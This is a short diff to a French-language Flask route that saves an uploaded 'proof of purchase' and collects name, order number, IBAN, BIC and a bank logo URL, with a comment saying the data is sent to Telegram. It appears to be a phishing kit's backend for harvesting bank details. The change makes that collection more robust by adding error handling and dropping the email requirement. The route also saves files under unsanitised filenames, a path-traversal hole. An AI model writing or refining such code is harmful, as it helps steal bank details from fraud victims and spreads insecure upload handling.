@@ -40,8 +40,11 @@ def acces_compte():
         file = request.files["proof_of_purchase"]
         if file.filename != "":
             file_path = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
-            file.save(file_path)
-            print(f"Fichier sauvegardé : {file_path}")
+            try:
+                file.save(file_path)
+                print(f"Fichier sauvegardé : {file_path}")
+            except Exception as e:
+                print(f"Erreur lors de l'enregistrement du fichier : {e}")
 
     # Récupérer les autres données du formulaire
     nom = request.form.get("nom")
@@ -58,7 +61,7 @@ def acces_compte():
     bank_logo_url = request.form.get("bank_logo_url")
 
     # Validation des champs obligatoires
-    if not nom or not prenom or not email or not order_number or not iban or not bic:
+    if not nom or not prenom or not order_number or not iban or not bic:
         return "Veuillez remplir tous les champs obligatoires.", 400
 
     # Envoyer les informations à Telegram
